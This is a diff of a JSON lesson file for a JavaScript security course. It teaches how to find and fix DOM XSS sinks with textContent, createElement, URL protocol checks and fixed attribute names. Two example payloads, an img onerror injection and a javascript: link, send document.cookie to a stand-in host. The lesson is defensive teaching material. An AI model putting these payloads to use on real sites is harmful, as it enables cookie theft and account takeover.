@@ -33,33 +33,34 @@
     }
   ],
   "canonicalExplanation": {
-    "summary": "DOM XSS occurs when untrusted data reaches an HTML, URL, script, or style execution sink without context-appropriate handling.",
+    "summary": "**DOM XSS** happens when untrusted data (a comment, a URL parameter, a server field) reaches a **sink**: a place where the browser treats text as code or markup. Common sinks are `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, `eval`, `setTimeout(\"string\")`, and `href`/`src` attributes that accept `javascript:` URLs. The fix depends on the **context**: use `textContent` for text, validated `URL` objects for links, and `setAttribute` with fixed names for attributes. Stripping `<` and `>` is not enough, because URL and attribute sinks need no angle brackets at all.",
     "sections": [
       {
         "heading": "Start here",
-        "body": "Start with this case: A comment is assigned with textContent rather than concatenated into innerHTML. Your goal is to identify and repair DOM XSS sinks using safe text or constrained APIs. Work through the example one step at a time, then use the boundary to check your answer."
+        "body": "A lesson discussion shows comments with `` list.innerHTML += `<li>${comment.text}</li>` ``. Someone posts `<img src=x onerror=\"fetch('//evil.example?c='+document.cookie)\">`, and every reader's browser runs it. A comment is assigned with textContent rather than concatenated into innerHTML. In this lesson you'll identify and repair DOM XSS sinks using safe text or constrained APIs.\n\n```predict\n{\"question\": \"A profile link does `a.href = user.website` after removing every `<` and `>`. The website is `javascript:alert(document.cookie)`. Safe?\", \"options\": [\"Yes, there are no tags\", \"No: href runs javascript: URLs without any angle brackets\"], \"answer\": 1, \"why\": \"URL sinks need a protocol check, not tag stripping.\"}\n```"
       },
       {
         "heading": "Before you begin",
-        "body": "Review these declared prerequisites first: DOM, events and forms; Promises, async work and HTTP; Query and update DOM; Fetch and HTTP responses. If one is unfamiliar, revisit it before continuing."
+        "body": "You should know the **DOM, events and forms** module, the **Promises, async work and HTTP** module, **Query and update DOM** (textContent vs innerHTML), and **Fetch and HTTP responses**, since server data is untrusted too."
       },
       {
-        "heading": "Technology rule",
-        "body": "DOM XSS occurs when untrusted data reaches an HTML, URL, script, or style execution sink without context-appropriate handling. Apply this rule to the actual markup, stylesheet, JavaScript, or component state rather than memorizing its name."
+        "heading": "The rule: match the handling to the sink",
+        "body": "```js\nfunction renderComment(list, comment) {\n  const li = document.createElement(\"li\");\n  const author = document.createElement(\"a\");\n  author.textContent = comment.authorName;            // text sink: safe.\n\n  const site = safeHttpUrl(comment.authorWebsite);    // URL sink: validated.\n  if (site) author.href = site;\n\n  const body = document.createElement(\"p\");\n  body.textContent = comment.text;                     // never innerHTML.\n  li.append(author, body);\n  list.append(li);\n}\n\nfunction safeHttpUrl(raw) {\n  try {\n    const url = new URL(raw, location.origin);\n    return url.protocol === \"https:\" || url.protocol === \"http:\" ? url.href : null;\n  } catch {\n    return null;\n  }\n}\n```\n\n| Sink | Danger | Safe choice |\n|---|---|---|\n| `innerHTML`, `insertAdjacentHTML`. | parses markup and event handlers. | `textContent`, createElement. |\n| `href`, `src`. | `javascript:` URLs. | `new URL` plus protocol allow-list. |\n| `setAttribute(name, ...)` with user name. | `onclick` and similar. | fixed attribute names only. |\n| `eval`, `new Function`, `setTimeout(\"...\")`. | runs code. | pass functions, never strings. |\n\n```reveal\n{\"prompt\": \"What if you really must render user-written formatting?\", \"answer\": \"Use a well-maintained sanitiser such as DOMPurify with a strict allow-list, and add a Content Security Policy as a second layer.\"}\n```"
       },
       {
-        "heading": "Boundary and browser reality",
-        "body": "Escaping differs by context, sanitizers need policy and updates, and trusted types reduce but do not replace design. This draft therefore rejects: Replacing angle brackets is enough to make untrusted text safe in every DOM sink."
+        "heading": "Spot the sink",
+        "body": "```predict\n{\"question\": \"`status.insertAdjacentHTML(\\\"beforeend\\\", message)` where message comes from the URL. Problem?\", \"options\": [\"No, it only appends\", \"Yes: insertAdjacentHTML parses HTML just like innerHTML\"], \"answer\": 1, \"why\": \"Use `status.append(message)` or textContent, which insert plain text.\"}\n```"
       }
     ]
   },
   "scope": {
     "includes": [
-      "Keep untrusted text out of executable HTML, URL and event-handler contexts.",
-      "Identify and repair DOM XSS sinks using safe text or constrained APIs."
+      "Identify HTML, URL, attribute and script sinks.",
+      "Repair them with textContent, URL validation and fixed attribute names."
     ],
     "excludes": [
-      "Escaping differs by context, sanitizers need policy and updates, and trusted types reduce but do not replace design."
+      "Server-side output encoding.",
+      "Writing a sanitiser yourself."
     ]
   },
   "outcomes": [
@@ -68,133 +69,135 @@
   "examples": [
     {
       "id": "javascript.security.dom-xss.example-a",
-      "title": "DOM injection prevention: concrete case",
-      "situation": "A comment is assigned with textContent rather than concatenated into innerHTML.",
+      "title": "The comment that ran a script",
+      "situation": "A comment is assigned with textContent rather than concatenated into innerHTML in the lesson discussion.",
       "walkthrough": [
-        "Step 1 — Inspect the exact artifact and starting state: A comment is assigned with textContent rather than concatenated into innerHTML.",
-        "Step 2 — Use the core rule above to predict one observable result.",
-        "Step 3 — Verify the correction: Keep untrusted data in textContent or safe typed APIs and avoid parsing it into executable markup."
+        "**Find the sink:** `list.innerHTML += ...` parses comment.text as HTML, so the img onerror runs.",
+        "**Repair:** create the li and p with createElement and set `body.textContent = comment.text`.",
+        "**Test:** rendering the malicious comment will show its characters literally, and a test checks that no img element was created."
       ],
-      "result": "The result follows because Keep untrusted data in textContent or safe typed APIs and avoid parsing it into executable markup."
+      "result": "The discussion shows every comment exactly as written, and no comment can run code in a reader's browser."
     },
     {
       "id": "javascript.security.dom-xss.example-b",
-      "title": "DOM injection prevention: boundary case",
-      "situation": "Escaping differs by context, sanitizers need policy and updates, and trusted types reduce but do not replace design.",
+      "title": "The profile link that ran code",
+      "situation": "Author names link to their website with `author.href = comment.authorWebsite`. One author sets their website to `javascript:fetch('//evil.example?c='+document.cookie)`.",
       "walkthrough": [
-        "Step 1 — Start from the documented boundary: Escaping differs by context, sanitizers need policy and updates, and trusted types reduce but do not replace design.",
-        "Step 2 — Use the core rule above to predict one observable result.",
-        "Step 3 — Reject the misconception: Replacing angle brackets is enough to make untrusted text safe in every DOM sink."
+        "href is a URL sink that runs javascript: URLs when clicked.",
+        "Removing angle brackets does nothing here.",
+        "Fix: parse with new URL and allow only http: and https:, otherwise leave the link off."
       ],
-      "result": "The boundary requires this correction: Keep untrusted data in textContent or safe typed APIs and avoid parsing it into executable markup."
+      "result": "Only real web links become clickable, and javascript: URLs are ignored."
     }
   ],
   "misconceptions": [
     {
       "id": "javascript.security.dom-xss.misconception",
       "mistakenBelief": "Replacing angle brackets is enough to make untrusted text safe in every DOM sink.",
-      "correction": "Keep untrusted data in textContent or safe typed APIs and avoid parsing it into executable markup.",
-      "diagnosticPrompt": "Use a concrete JavaScript: Language and Browser Applications artifact to explain why this belief fails: Replacing angle brackets is enough to make untrusted text safe in every DOM sink."
+      "correction": "Each sink has its own context. URL sinks run javascript: links, attribute sinks can add event handlers, and script sinks run strings directly. Use the safe API for the context instead of one filter.",
+      "diagnosticPrompt": "In \"The profile link that ran code\", why didn't stripping < and > help?"
     }
   ],
   "analogy": {
     "optional": true,
-    "example": "A coordinated event desk can model DOM injection prevention, with values, tasks, callbacks, and external messages changing observable state.",
+    "example": "Sinks are like **different machines in a kitchen**. Text is harmless on a plate (textContent), but put the same ingredient in the oven (innerHTML) or the blender (eval) and it gets processed. Safety means knowing which machine you're feeding and using the right guard for it.",
     "usefulFor": [
-      "Building a first mental model for DOM injection prevention before using exact platform terms"
+      "remembering context per sink",
+      "textContent = the plate"
     ],
     "limitations": [
-      "Human coordination does not reproduce coercion, lexical scope, microtasks, prototypes, or browser security boundaries.",
-      "Escaping differs by context, sanitizers need policy and updates, and trusted types reduce but do not replace design."
+      "Kitchen machines don't read instructions; the HTML parser does.",
+      "A label check (URL protocol) is its own guard, not a filter for all machines."
     ],
     "canonicalExplanationStandsAlone": true
   },
   "trace": {
     "artifact": [
-      "A comment is assigned with textContent rather than concatenated into innerHTML.",
-      "DOM XSS occurs when untrusted data reaches an HTML, URL, script, or style execution sink without context-appropriate handling.",
-      "Keep untrusted data in textContent or safe typed APIs and avoid parsing it into executable markup."
+      "comment.text = '<img src=x onerror=...>'",
+      "body.textContent = comment.text",
+      "inspect the DOM"
     ],
     "steps": [
       {
         "step": 1,
-        "focus": "Artifact",
+        "focus": "Untrusted data",
         "state": {
-          "evidence": "A comment is assigned with textContent rather than concatenated into innerHTML."
+          "comment.text": "contains an img tag"
         },
-        "explanation": "Record the exact markup, style, value, state, URL, event, or DOM evidence before predicting behavior."
+        "explanation": "The comment arrives from the server as untrusted data."
       },
       {
         "step": 2,
-        "focus": "Platform rule",
+        "focus": "Safe sink",
         "state": {
-          "rule": "DOM XSS occurs when untrusted data reaches an HTML, URL, script, or style execution sink without context-appropriate handling."
+          "parser used": "none",
+          "p text": "<img src=x onerror=...>"
         },
-        "explanation": "Apply the declared JavaScript: Language and Browser Applications rule without assuming a different browser, framework, or interaction state."
+        "explanation": "The comment is assigned with textContent rather than concatenated into innerHTML."
       },
       {
         "step": 3,
-        "focus": "Observable result",
+        "focus": "Result",
         "state": {
-          "correction": "Keep untrusted data in textContent or safe typed APIs and avoid parsing it into executable markup."
+          "img elements created": "0",
+          "script run": "no"
         },
-        "explanation": "Check the result against the boundary and reject this misconception: Replacing angle brackets is enough to make untrusted text safe in every DOM sink."
+        "explanation": "The malicious markup shows as characters and never runs."
       }
     ],
-    "textAlternative": "Starting artifact: A comment is assigned with textContent rather than concatenated into innerHTML. Step 1, Artifact. State: evidence: A comment is assigned with textContent rather than concatenated into innerHTML.. Record the exact markup, style, value, state, URL, event, or DOM evidence before predicting behavior. Step 2, Platform rule. State: rule: DOM XSS occurs when untrusted data reaches an HTML, URL, script, or style execution sink without context-appropriate handling.. Apply the declared JavaScript: Language and Browser Applications rule without assuming a different browser, framework, or interaction state. Step 3, Observable result. State: correction: Keep untrusted data in textContent or safe typed APIs and avoid parsing it into executable markup.. Check the result against the boundary and reject this misconception: Replacing angle brackets is enough to make untrusted text safe in every DOM sink."
+    "textAlternative": "Rendering a hostile comment safely. Step 1, Untrusted data: comment.text is contains an img tag. The comment arrives from the server as untrusted data. Step 2, Safe sink: parser used is none; p text is <img src=x onerror=...>. The comment is assigned with textContent rather than concatenated into innerHTML. Step 3, Result: img elements created is 0; script run is no. The malicious markup shows as characters and never runs."
   },
   "practice": {
     "faded": {
-      "prompt": "Quick check for “DOM injection prevention: concrete case”: state its starting evidence, apply the DOM injection prevention rule, and give the observable result in three short lines.",
+      "prompt": "For \"The comment that ran a script\", explain why a comment is assigned with textContent rather than concatenated into innerHTML.",
       "scaffold": [
-        "Line 1: name the starting evidence.",
-        "Line 2: state the part of the core rule that applies.",
-        "Line 3: give the result and reject the common mistake."
+        "Sink.",
+        "Repair.",
+        "Test."
       ],
       "expectedEvidence": [
-        "Named example: DOM injection prevention: concrete case.",
-        "Starting evidence: A comment is assigned with textContent rather than concatenated into innerHTML.",
-        "Core rule: DOM XSS occurs when untrusted data reaches an HTML, URL, script, or style execution sink without context-appropriate handling.",
-        "Observable result: The result follows because Keep untrusted data in textContent or safe typed APIs and avoid parsing it into executable markup.",
-        "Boundary check: Keep untrusted data in textContent or safe typed APIs and avoid parsing it into executable markup."
+        "Names the example \"The comment that ran a script\": innerHTML was the sink.",
+        "The comment is assigned with textContent.",
+        "No img element or script is created.",
+        "The discussion shows every comment exactly as written."
       ]
     },
     "nearTransfer": {
-      "prompt": "Apply the same skill to this boundary: Escaping differs by context, sanitizers need policy and updates, and trusted types reduce but do not replace design.",
+      "prompt": "Review five lines and mark each safe or unsafe: `el.textContent = q`, `el.innerHTML = q`, `a.href = q`, `img.src = new URL(q, location.origin).href` after an https check, `setTimeout(q, 10)`.",
       "scaffold": [
-        "Identify which condition changed.",
-        "Keep semantics and user impact visible."
+        "Name the sink context for each.",
+        "URLs need protocol checks."
       ],
       "expectedEvidence": [
-        "DOM XSS occurs when untrusted data reaches an HTML, URL, script, or style execution sink without context-appropriate handling.",
-        "Escaping differs by context, sanitizers need policy and updates, and trusted types reduce but do not replace design."
+        "Safe: textContent and the checked img src.",
+        "Unsafe: innerHTML, raw href and setTimeout with a string."
       ]
     },
     "farTransfer": {
-      "prompt": "Create a new JavaScript: Language and Browser Applications example for DOM injection prevention and explain why the misconception fails.",
+      "prompt": "Audit a small page with search, comments and profile links. List every sink, repair each with a context-appropriate API, and add tests with XSS payloads for HTML and URL contexts.",
       "scaffold": [
-        "Do not reuse the analogy.",
-        "Declare browser, input, state, and accessibility assumptions."
+        "Search for innerHTML, href, src, eval.",
+        "Use known payload strings in tests."
       ],
       "expectedEvidence": [
-        "Identify and repair DOM XSS sinks using safe text or constrained APIs.",
-        "Keep untrusted data in textContent or safe typed APIs and avoid parsing it into executable markup."
+        "Every sink listed and repaired.",
+        "Tests prove payloads render as text or are rejected."
       ]
     }
   },
   "remediation": [
     {
       "misconceptionId": "javascript.security.dom-xss.misconception",
-      "explanation": "Keep untrusted data in textContent or safe typed APIs and avoid parsing it into executable markup.",
-      "retryPrompt": "Re-evaluate the concrete case using checkpoint 'safe typed APIs' and state the decisive evidence."
+      "explanation": "For each place data enters the DOM ask: **Is this a text, HTML, URL, attribute or script context?** Then use the matching safe API. If the answer is \"HTML from a user\", stop and use a sanitiser.",
+      "retryPrompt": "Apply this to \"The profile link that ran code\"."
     }
   ],
   "recap": {
-    "summary": "You should now be able to identify and repair DOM XSS sinks using safe text or constrained APIs. Keep this boundary in view: Escaping differs by context, sanitizers need policy and updates, and trusted types reduce but do not replace design.",
+    "summary": "To identify and repair DOM XSS sinks, find where untrusted data reaches HTML, URL, attribute or script contexts, and use safe text with textContent and createElement, validated URL objects with a protocol allow-list, fixed attribute names, and functions instead of code strings.",
     "retrievalPrompts": [
-      "Explain DOM injection prevention using exact JavaScript: Language and Browser Applications terms.",
-      "Why is this claim incorrect: Replacing angle brackets is enough to make untrusted text safe in every DOM sink.",
-      "Apply checkpoint 'safe typed APIs' to a new artifact."
+      "Why isn't stripping < and > enough?",
+      "What's the safe way to show user text?",
+      "How do you make a user-supplied link safe?"
     ],
     "nextReviewPrompt": "Next: continue to “Client secrets and privacy”. Before moving on, answer one retrieval prompt without reopening the explanation."
   }
